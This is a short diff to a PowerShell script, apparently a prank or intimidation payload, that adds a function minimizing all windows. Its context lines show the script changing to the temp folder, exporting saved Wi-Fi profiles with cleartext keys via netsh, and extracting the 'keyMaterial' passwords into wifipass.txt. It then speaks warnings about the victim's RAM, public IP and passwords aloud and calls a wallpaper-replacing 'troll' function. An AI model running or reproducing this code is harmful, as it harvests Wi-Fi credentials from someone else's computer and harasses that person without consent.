@@ -330,6 +330,14 @@ public class Params
 
 #############################################################################################################################################
 
+Function Minimize-All
+{
+	$apps = New-Object -ComObject Shell.Application
+	$apps.MinimizeAll()
+}
+
+#############################################################################################################################################
+
 cd $env:temp\
 netsh wlan export profile key=clear
 Select-String -Path Wi*.xml -Pattern 'keyMaterial' > wifipass.txt
@@ -619,6 +627,8 @@ $s.Speak($RAMwarn)
 $s.Speak($PUB_IPwarn)
 
 $s.Speak($PASSwarn)
+
+Minimize-All
 
 WallPaper-Troll
 
